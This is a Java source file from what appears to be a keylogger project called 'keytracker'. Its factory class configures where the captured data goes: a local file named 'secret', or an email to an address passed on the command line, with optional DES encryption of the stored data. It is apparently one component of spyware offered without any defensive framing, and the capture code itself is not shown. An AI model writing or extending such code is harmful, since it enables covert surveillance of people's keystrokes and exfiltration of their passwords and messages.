package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.file.MyFileWriter;
import com.keytracker.file.MyMailWriter;
import com.keytracker.mail.MailSender;

import javax.crypto.SecretKey;

public class MechanismsFactoryImpl implements MechanismsFactory {
    private final ArgsResolver argsResolver;
    private final MailSender mailSender;
    private final SecretKey secretKey;

    public MechanismsFactoryImpl(ArgsResolver argsResolver, MailSender mailSender, SecretKey secretKey) {
        this.argsResolver = argsResolver;
        this.mailSender = mailSender;
        this.secretKey = secretKey;
    }

    @Override
    public StoreMechanism getStoreMechanism() {
        StoreMechanism storeMechanism = storeMechanism();

        if (argsResolver.isFileArgPresent()) {
            storeMechanism.registerWriter(new MyFileWriter("secret"));
        }
        if (argsResolver.isMailArgPresent()) {
            storeMechanism.registerWriter(new MyMailWriter(mailSender, argsResolver.getEmail()));
        }
        if (!argsResolver.isMailOrFileArgPresent()) {
            storeMechanism.registerWriter(new MyFileWriter("secret"));
        }

        return storeMechanism;
    }

    private StoreMechanism storeMechanism() {
        if (argsResolver.isCryptArgPresent()) {
            return new CryptedStoreMechanism(new Encryptor(secretKey, "DES"));
        }

        return new BundledStoreMechanism();
    }
}
